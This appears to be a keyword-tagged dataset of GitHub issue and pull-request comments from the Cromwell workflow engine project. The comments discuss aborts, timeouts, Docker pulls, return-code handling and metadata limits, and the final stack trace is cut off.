Safety,"> So a docker_pull command would have to be executed at task execution time. But then it is redundant. This command can be part of the submit script. I looked into this a while ago so I might be wrong, but I think a `docker_pull` hook would still be useful, even at runtime, because it would be run only once, and *not* scattered, unlike the actual `submit_docker` hook. This would give it time to pull/convert the container without any race condition issues, meaning we don't have to use `flock` or any of that messy bash. The execution graph would look like:; ```; pull_docker; ⭩ ↓ ⭨; submit submit submit; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627386598:92,redund,redundant,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627386598,1,['redund'],['redundant']
Safety,"> This change looks safe to me but before merging:; > ; > * As the owners of this code has someone from the BT team(?) cloned this and run it through whatever test(s) are in Travis and/or Jenkins?; Are there some special tests needs to be run for this? If so, no. The tests that were run with the build(travis) passed.; > * Mainly out of curiosity: any idea if the whole AWS backend stopped working where/when/what broke? For example: did the recent dependency upgrades in 68 break something the existing test(s) didn't catch? There wasn't much background in the ticket as to why this fix was suddenly needed, so again just curious.; On EFS backend, the script for each cromwell task gave permission denied error before this fix. It's nothing to do with 68 dependency upgrade. This is caused by changes made for CROM-6682. It affects only the AWS-EFS backend.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094:20,safe,safe,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6431#issuecomment-918183094,1,['safe'],['safe']
Safety,"> This is fantastic work! Which makes me feel terrible saying: I hadn't realized until reviewing the spec just now that the new `returnCodes` actually means exactly the same thing as the existing `continueOnReturnCode`, with the addition of `*`. Would it be possible to modify the existing `continueOnReturnCode` handling to include the runtime attribute `returnCodes` rather than creating a parallel method for controlling the same thing?. I abstracted out the duplicated code between `returnCodes` and `continueOnReturnCode` to a new trait `ReturnCode` (which is very creatively named :) ). I think this is the best solution to avoid code duplication while also supporting both `returnCodes` and continueOnReturnCode`, but let me know if there is anything else I should modify to decrease parallelism.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7389#issuecomment-2012365133:630,avoid,avoid,630,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7389#issuecomment-2012365133,1,['avoid'],['avoid']
Safety,"> We use lots of different runtime attributes (bsub job submission parameters) in our workflows.  ; > ; > With existing Cromwell backends, you need to put all the possible runtime attributes in the code itself.  Would it be possible to let the user specify arbitrary runtime parameters only in the configuration file (not in the source code) that Cromwell just passes to the submit command?  ; > ; > We want to avoid asking for Cromwell code changes every time we decide to use a new bsub parameter. -- Pfizer",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1217:411,avoid,avoid,411,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1217,1,['avoid'],['avoid']
Safety,">Don't just create the IO, run it. That's one way to avoid side effects, for sure",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5095#issuecomment-522021556:53,avoid,avoid,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5095#issuecomment-522021556,1,['avoid'],['avoid']
Safety,">The issue is that she's asking to have everything dumped into one location. In many workflows I have a task like this:; ```. task copy {; Array[File] files; String destination. command {; mkdir -p ${destination}; cp -L -R -u ${sep=' ' files} ${destination}; }. output {; Array[File] out = files; }; }; ```; And I apply this task to all final outputs of my workflows because my colleagues do not want to go into super-nested folder structure with many debugging files (like logs and so on), they just want to get the final results! Having a flat-copy feature will save me from copy-pasting this task everywhere =) . Regarding overwrite risks, I think they are exaggerated:; 1) Usually, it takes you multiple runs until you get everything working, however, after that you switch to another dataset and point other members of the team to the folder they should go to pick the results from you. As I understand the copying of the workflow output happens only when the workflow succeeded.; 2) The final output folder is assigned in the options. That means that for another run you can simply change it.; 3) It is possible to put rewriting only if last file is newer than previous.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-345849355:636,risk,risks,636,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-345849355,2,['risk'],['risks']
Safety,"@EvanTheB I think I can answer that for you... much like `check-alive`, the `run-in-background` config point is only relevant for aborts and restarts; cromwell identifies what it needs to kill or restart based on the PID instead of the scheduler job id. The only way that cromwell knows whether a job is done or not is by checking for the existence of the `rc` file.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-380681715:130,abort,aborts,130,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-380681715,1,['abort'],['aborts']
Safety,@Horneth - after talking to @scottfrazer I was hoping to avoid this requiring a WDL4S change (i.e. and therefore let it be a Cromwell custom function rather than a core feature of the WDL spec),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/968#issuecomment-224378806:57,avoid,avoid,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/968#issuecomment-224378806,1,['avoid'],['avoid']
Safety,"@Horneth Anyone who would disagree with ""avoid creating new Workflow Actors-like"" should be sent to the guillotine",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195434155:41,avoid,avoid,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195434155,1,['avoid'],['avoid']
Safety,"@Horneth Does this mean we should hold off before claiming we ""fixed aborts""? :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2820#issuecomment-341607290:69,abort,aborts,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2820#issuecomment-341607290,1,['abort'],['aborts']
Safety,"@Horneth I believe the transformation is more like `StateData + DB Calls` to `DB Calls + more DB Calls`. Currently, the AbortAll route just sends a msg to all the WorkflowActorRefs in the state data, and then waits's until the all the actors have responded with a terminal state.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-201068582:120,Abort,AbortAll,120,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-201068582,1,['Abort'],['AbortAll']
Safety,"@Horneth I think this was originally added by you (but git blame might be lying...), could you sanity check this?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4085:95,sanity check,sanity check,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4085,1,['sanity check'],['sanity check']
Safety,@Horneth Is it safe to say that this is close-able? We can add new tickets for specific change requests,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2403#issuecomment-414084949:15,safe,safe,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2403#issuecomment-414084949,1,['safe'],['safe']
Safety,"@Horneth Oh, I forgot that we always try to `evaluate` first, then predict second.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4208#issuecomment-427135891:67,predict,predict,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4208#issuecomment-427135891,1,['predict'],['predict']
Safety,"@Horneth Right. It should be impossible to hit but we have to put something there for the state anyways so I figured might as well keep it there to be safe. The alternative is to put a NullFunctions there (or whatever it is called), I'm happy to do either",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/150#issuecomment-134294537:151,safe,safe,151,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/150#issuecomment-134294537,1,['safe'],['safe']
Safety,"@Horneth While there are places we can't help it, I""d prefer we avoid creating Futures inside of actors, instead preferring worker actors for async behavior. That helps to preserve the actor model/abstraction and removes a huge potential pitfall",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218550510:64,avoid,avoid,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218550510,1,['avoid'],['avoid']
Safety,@Horneth how about this ticket for testing aborts?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-337074635:43,abort,aborts,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2088#issuecomment-337074635,1,['abort'],['aborts']
Safety,"@LeeTL1220 @Horneth I doubt enabling continue on return would work. You are getting timeouts not only when uploading log files, but also when localizing files. Ive observed this occasionally to with wide scatters and multiple workflows. ; It starting to seem more like an api Issue. I know in the cromwell conf there is a property for setting the total number of concurrent workflows, but I do not know if this is extended to the task level. It would be interesting to see whether or not limiting the number of concurrent tasks in a scatter would have any impact on this. That or better scattering the task submission for scatters instead of submitting all tasks basically at once. This is one of our major pain points too. So far the only reasonable solution we have had (other then adjusting api quotas) is just to tell users to rerun a wf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300177559:84,timeout,timeouts,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300177559,1,['timeout'],['timeouts']
Safety,"@LeeTL1220 @Horneth I ran into similar issues when running > 400 Tasks Simultaneously. I would occasionally get 403 from the JES backend from various causes; - size built in function would timeout ; - Pulling the docker image from gcr.io would time out; - occasionally pulling the docker image from docker hub would also time out; - I also observed the above error that you were experiencing as well. I was not able to debug any of them, because of the transient nature. Rerunning the workflow generally fixed the problem. I am also using preemptible instances for the majority of the tasks that were being run, however I do not see how that could be contributing to the issue. If anything i would guess that we are bumping into an api quota and are being throttled by google leading to the timeouts",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300167322:189,timeout,timeout,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300167322,2,['timeout'],"['timeout', 'timeouts']"
Safety,@LeeTL1220 is this related to #1495 in that the Ctl-C did not properly abort? If so then I'd like to track the effort there and I'll close this.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-325444026:71,abort,abort,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1600#issuecomment-325444026,1,['abort'],['abort']
Safety,@LeeTL1220 is this still something you want? Can you explain a bit more about your use case for wanting to override a runtime attribute?. @geoffjentry what would the effort be to add this feature? Any risks in adding it?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-323857659:201,risk,risks,201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-323857659,1,['risk'],['risks']
Safety,"@LeeTL1220 my `reference.conf` database section looks correct:. ```; database {; # hsql default; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = ""jdbc:hsqldb:mem:${uniqueSchema};shutdown=false;hsqldb.tx=mvcc""; connectionTimeout = 3000; }. # mysql example; #driver = ""slick.driver.MySQLDriver$""; #db {; # driver = ""com.mysql.jdbc.Driver""; # url = ""jdbc:mysql://host/cromwell?rewriteBatchedStatements=true""; # user = ""user""; # password = ""pass""; # connectionTimeout = 5000; #}. # For batch inserts the number of inserts to send to the DB at a time; # insert-batch-size = 2000. migration {; # For databases with a very large number of symbols, selecting all the rows at once can generate a variety of; # problems. In order to avoid any issue, the selection is paginated. This value sets how many rows should be; # retrieved and processed at a time, before asking for the next chunk.; read-batch-size = 100000. # Because a symbol row can contain any arbitrary wdl value, the amount of metadata rows to insert from a single; # symbol row can vary from 1 to several thousands (or more). To keep the size of the insert batch from growing out; # of control we monitor its size and execute/commit when it reaches or exceeds writeBatchSize.; write-batch-size = 100000; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2217#issuecomment-298110016:760,avoid,avoid,760,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2217#issuecomment-298110016,1,['avoid'],['avoid']
Safety,"@LeeTL1220 this is a dual problem: [aborts need work](https://docs.google.com/document/d/1B0FElJXOp4IP-v24C62CLsC0JQMbQPjaIrjOwnDqko8/edit), and [logs need work](https://docs.google.com/document/d/1Dc37EaPDoWXacSSzLgCdndx9zo5k6EmE5tvg-2fisPo/edit#). I'm going to link this issue there and close it out.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1637#issuecomment-325668920:36,abort,aborts,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1637#issuecomment-325668920,1,['abort'],['aborts']
Safety,"@adamstruck I still need to do a more in depth review if you're looking for scala syntax feedback (ex: `case … => { … }` could be `case … => …`). Early feedback:. - PR 1930 contains a few more changes to the standard backend api. I tested cherry-picking 1930 onto this PR to see what would be left to patch up. Using an ""Obsolete"" set of bridge code for now, [these](https://github.com/kshakir/cromwell/commit/19f3bad4ca752ac47ab6f37b694dbdaec8850b36) are the minimal changes for the updated path api, plus changes for standardized command line generation. NOTE: 1930 is still under review and may change, plus the linked github commit will be deleted once these two PRs are merged. - The standard backend will continue to change for a while as we move more common code. For example, the script generation for globs is now centralized as of PR 1930. The only CI testing I am aware of at the moment is `sbt tesBackend/test` that runs under travis. Is there a dockerized solution yet for TES that we could use with travis centaur, like we have for JES and Local? Otherwise, the minimal patches above pass the very, very basic sbt test unit tests. - Your PR is ok as is, but I need to think about necessity of `Async.await` a bit more. The standard backend api is synchronous, requiring the `Async.await`. But the underlying ""basic"" backend trait is using scala futures, and I need more insight into how those are interacting with the akka actors. For example, I wouldn't want the actors receiving multiple akka poll messages in the mailbox and then queuing up dozens of overlapping poll futures in the thread pool. I also really like that your awaits have timeouts and aren't infinite futures. More to come. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1816#issuecomment-276378295:1654,timeout,timeouts,1654,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1816#issuecomment-276378295,2,['timeout'],['timeouts']
Safety,"@aednichols I agree with your point regarding Google. However, I feel like there is a huge conflict of interest here: how can Google motivate itself to fix something that could potentially allow them to make a lot of money? How does Google suggest users should fix this problem? It seems a huge financial risk to include docker images in `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io` as the corresponding buckets need to be public and cannot be set as Requester Pays, so anybody can download them at will. Do you have advice for how to best reach out to them to advocate for this?. Replicating images across regions is currently not very sustainable as it would rely on users' good will and understanding of this complicated problem, as Cromwell does not have a framework to automatically understand within a workflow which docker images it should pull. If Google does not get their act together, I suppose that ultimately the Cromwell team has to come to terms with the fact that the `us.gcr.io`, `eu.gcr.io`, and `asia.gcr.io` repository solutions are not sustainable and an alternative will need to be engineered and provided to those writing WDL pipelines. Not sure what the easiest solution would be though. Cromwell currently has some framework for dealing deferentially with Files with optional localization when a WDL is run on Google Cloud. Could something be included in Cromwell to allow the WDL to know in which Google cloud the tasks are being run so that at least the best repository could be automatically selected?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884342364:305,risk,risk,305,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-884342364,1,['risk'],['risk']
Safety,"@alartin - the concurrent-job-limit limits how many jobs will be in a ""runnable / running"" state at a time. It also has the side effect of limiting how many jobs are submitted when the workflow starts. Scatter jobs do not currently map to AWS Batch Array jobs. It would definitely be a good thing to implement and it would also be an effective way to avoid API request limits.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-442973335:351,avoid,avoid,351,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-442973335,1,['avoid'],['avoid']
Safety,@antonkulaga It'll probably be > 1 week. We can't predict the frequency of the dot releases as they're almost always in response to some fire that erupts in production.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3306#issuecomment-367445955:50,predict,predict,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3306#issuecomment-367445955,1,['predict'],['predict']
Safety,"@aofarrel I recommend setting a [`concurrent-job-limit`](https://cromwell.readthedocs.io/en/stable/backends/Backends/) value of 1 so that Cromwell only starts one job at once. . The interface between Cromwell and its backends is designed so that resource management happens entirely within the backend. As such, Cromwell never knows how much memory/CPU a backend has; rather the backend is expected to start as many jobs as it can safely handle and stop when it reaches the limit. What you're finding is that the local backend, implemented with Docker, doesn't support that self-management because it is a non-goal of the Docker product itself. Docker tries to start whatever containers you request, immediately. Since I _think_ `concurrent-job-limit` should fully address your problem, I am going to close the issue. If that's not the case feel free to reopen.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-803082272:431,safe,safely,431,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-803082272,1,['safe'],['safely']
Safety,@bradtaylor can you clarify which issue is more concerning? Is it the aborting issue or the status updating?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334499574:70,abort,aborting,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334499574,1,['abort'],['aborting']
Safety,"@cjllanwarne #811 #812 for Local and JES config sanity checking, #813 to create filesystems in the initialization actor. The logging issue might be better suited for discussion prior to ticketing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/797#issuecomment-217980738:48,sanity check,sanity checking,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/797#issuecomment-217980738,1,['sanity check'],['sanity checking']
Safety,@cjllanwarne - good points about having it optional. I'll look into adding a config option and only running this code if they specify Jes as the backend and also abort.jobs.on.terminate (or whatever it should be called),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-173971121:162,abort,abort,162,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-173971121,1,['abort'],['abort']
Safety,"@cjllanwarne ; Are you saying that Cromwell is going to determine if the input file is reference file by checking each input file against the manifest file? This is not how I imagined it. I thought manifest file with checksums is only needed to verify file's up-to-dateness. I imagined it work this way: when user creates a WDL and specifies input files for the workflow, they would look like `gs://gcp-public-data--broad-references/some/path/reference_file.txt`. Cromwell will see this path and think ""ok, this file is a reference file, since it's located in this special bucket, so I will mount a references disk to `/mnt/refdisk` and check for this file in the `/mnt/refdisk/some/path/reference_file.txt` location, but before going on and doing that I'll verify that checksum of that file in GCS matches the one in manifest file"".; I mean bucket name seems redundant in this case, since it's the same for all reference files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5587#issuecomment-664613517:860,redund,redundant,860,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5587#issuecomment-664613517,1,['redund'],['redundant']
Safety,"@cjllanwarne ; I'm not sure I fully understand what you mean here. `checkalive` does run/schedule when `isAlive` is called.; Al tough I think what I use now is almost as you did explain. Only difference is that I first do isAlive instead of checking the exitcode. In f30c2be I did switch this. (first exitcode, then isAlive). Before I did had a default timeout of 120 seconds but I did remove that because of earlier comments. I can bring that back in if you want?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423934018:353,timeout,timeout,353,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423934018,1,['timeout'],['timeout']
Safety,"@cjllanwarne @Horneth re the saving people from themselves, while I don't completely disagree what would be the use case here? If someone is running in local or SGE mode they'd need to be running Cromwell with (for now) Google credentials which means they probably know what they're doing. The ""don't completely disagree"" part is that I support the idea in general but think it should default to the unsafe direction as IMO it's more likely someone gets bit by it being turned off than turned on.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161060201:400,unsafe,unsafe,400,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161060201,1,['unsafe'],['unsafe']
Safety,"@cjllanwarne @aednichols Sorry for my late reaction, I was on holiday last week. I have removed the forInput variable entirely thanks to @cjllanwarne's feedback. Instead I created the `makeInputSpecificFunctions` in the `IoFunctionSet` trait so every backend can use it. I then overrided it in the sfsBackend to return another class with a different postmapping. This made the `forInput` variable redundant.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5495#issuecomment-623374492:397,redund,redundant,397,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5495#issuecomment-623374492,2,['redund'],['redundant']
Safety,"@cjllanwarne Firecloud needs it, this is to avoid cromwell to always require a google auth (even when running only local backend).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1135#issuecomment-231374697:44,avoid,avoid,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1135#issuecomment-231374697,1,['avoid'],['avoid']
Safety,"@cjllanwarne I pointed to the wrong line of code, sorry for that. I have identified the bug. The refactoring produced **better** code. The code written before the refactoring created a rc file with exit code `9`(Which was probably a mistake as the comments above the code said that 137 was chosen, for kill -9). `137` for SIGKILL would have been the better value. The current refactored code uses SIGTERM (`143`). This looks nicer, but unfortunately the functionality of the code depended on the choice for `9`. . If cromwell gets SIGINT (`130`) , SIGKILL (`137`) or SIGTERM(`143`) as exit codes for a job, it assumes that cromwell was the one that aborted them and the jobs should NOT be retried. This makes perfect sense. . The refactored code now returns a return code(`143`) that makes cromwell believe that the job should not be retried. My solution would be to write a non-sensical return code in the case exit-timeout-seconds is used. I am working on a pr now. EDIT: This change indeed fixes the problem. PR coming.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4998#issuecomment-496236589:649,abort,aborted,649,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4998#issuecomment-496236589,2,"['abort', 'timeout']","['aborted', 'timeout-seconds']"
Safety,@cjllanwarne I think it's finished now. Meanwhile I detected a bug but did solve this with an other opt-in config value to be able to retry jobs that are aborted. Aborted here means an exitcode above 128 if i read the code correctly. Maybe rename this to ExternalKill instead?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-426991174:52,detect,detected,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-426991174,3,"['Abort', 'abort', 'detect']","['Aborted', 'aborted', 'detected']"
Safety,@cjllanwarne and @geoffjentry ; I did make a change that when exit-code-timeout is not set `isAlive` is not used anymore. One note I need to make about this. This can give the wrong impression to HPC users. isAlive is there the only way to ensure if a job is still running while the rc file is not stable.; This is a setting that should be default for all dispatch systems that does force kill the jobs.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-424634854:72,timeout,timeout,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-424634854,1,['timeout'],['timeout']
Safety,"@cjllanwarne any update on whether this is still an issue? I know aborts is a tangled mess, is this still part of that?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2050#issuecomment-329662040:66,abort,aborts,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2050#issuecomment-329662040,1,['abort'],['aborts']
Safety,"@cjllanwarne example scenario:. - Workflow starts; - a few jobs start; - cromwell is restarted; - immediately after, someone aborts this workflow. the workflow can be anywhere from still in the workflow store (waiting to be picked up and restarted) to executing. If it's anywhere but executing (could be materialization, workflow initialization...), the behavior right now is ""we're not executing this workflow yet, which means we haven't started any jobs, so it's fine to just mark it aborted and stop"". This doesn't work because this workflow does have running jobs that will 1) never be aborted 2) stay ""running"" forever in the metadata",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2829#issuecomment-342651363:125,abort,aborts,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2829#issuecomment-342651363,3,['abort'],"['aborted', 'aborts']"
Safety,@cjllanwarne provided you're fully satisfied that it's safe and is well tested I'm good,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3938#issuecomment-409374762:55,safe,safe,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3938#issuecomment-409374762,1,['safe'],['safe']
Safety,"@cjllanwarne regarding merges to master, there indeed was a merge of the grammar change for call blocks. The new parser worked just fine without the associated Cromwell changes, which is proof that the bugfix is safe with respect to WDL implementations.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4789#issuecomment-479653436:212,safe,safe,212,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4789#issuecomment-479653436,1,['safe'],['safe']
Safety,@cjllanwarne thanks for the feedback. I added the requested code. In the testing I took care to avoid code duplication. Is the code up to cromwell standards?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-421985663:96,avoid,avoid,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4088#issuecomment-421985663,2,['avoid'],['avoid']
Safety,"@cjllanwarne that's a great point. This should be super test-able as well to see if its easy to recreate. I also wonder if we can see a ""spike"" of aborting workflow states after a restart in grafana -- not sure if that's actually feasible?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4767#issuecomment-482741999:147,abort,aborting,147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4767#issuecomment-482741999,1,['abort'],['aborting']
Safety,"@cjllanwarne there was one `ignore`d test about default runtime attributes that pretty clearly seemed to be covered by newer tests, so I've deleted that as well. There's one other abort test we should definitely continue to feel bad about, and another test for a ""taskless workflow"" for which I couldn't readily find an equivalent.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2566#issuecomment-324120498:180,abort,abort,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2566#issuecomment-324120498,2,['abort'],['abort']
Safety,@cjllanwarne what's the WEA? Sounds like another one for the [Aborts google doc](https://docs.google.com/document/d/1B0FElJXOp4IP-v24C62CLsC0JQMbQPjaIrjOwnDqko8/edit).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1521#issuecomment-325027517:62,Abort,Aborts,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1521#issuecomment-325027517,1,['Abort'],['Aborts']
Safety,"@cjllanwarne, checked works as expected:; ```; 2020-06-04 21:43:38,063 cromwell-system-akka.dispatchers.engine-dispatcher-29 INFO - WorkflowManagerActor WorkflowActor-796f3949-47e6-497e-9458-59ab53a063c6 is in a terminal state: WorkflowSucceededState; 2020-06-04 21:43:43,504 cromwell-system-akka.actor.default-dispatcher-56 ERROR - Carboniting failure: cromwell.services.MetadataTooLargeNumberOfRowsException: Metadata for workflow 796f3949-47e6-497e-9458-59ab53a063c6 exists indatabase, but cannot be served. This is done in order to avoid Cromwell failure: metadata is too large - 283000000 rows, and may cause Cromwell instance to die on attempt to read it in memory. Configured metadata safety limit is 1000000.. Marking as TooLargeToArchive; cromwell.services.MetadataTooLargeNumberOfRowsException: Metadata for workflow 796f3949-47e6-497e-9458-59ab53a063c6 exists indatabase, but cannot be served. This is done in order to avoid Cromwell failure: metadata is too large - 283000000 rows, and may cause Cromwell instance to die on attempt to read it in memory. Configured metadata safety limit is 1000000.; 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor$$anonfun$2.applyOrElse(MetadataBuilderActor.scala:283); 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor$$anonfun$2.applyOrElse(MetadataBuilderActor.scala:267); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:38); 	at akka.actor.FSM.processEvent(FSM.scala:707); 	at akka.actor.FSM.processEvent$(FSM.scala:704); 	at cromwell.services.metadata.impl.builder.MetadataBuilderActor.akka$actor$LoggingFSM$$super$processEvent(MetadataBuilderActor.scala:245); 	at akka.actor.LoggingFSM.processEvent(FSM.scala:847); 	at akka.actor.LoggingFSM.processEvent$(FSM.scala:829); 	at 